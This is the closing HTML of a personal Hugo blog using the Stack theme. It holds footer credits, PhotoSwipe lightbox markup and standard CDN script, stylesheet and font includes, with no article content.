    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 Frederick
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<style>
  body {
    background: url(https://Frederick2313072.github.io/background/background.jpg) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

    </body>
</html>
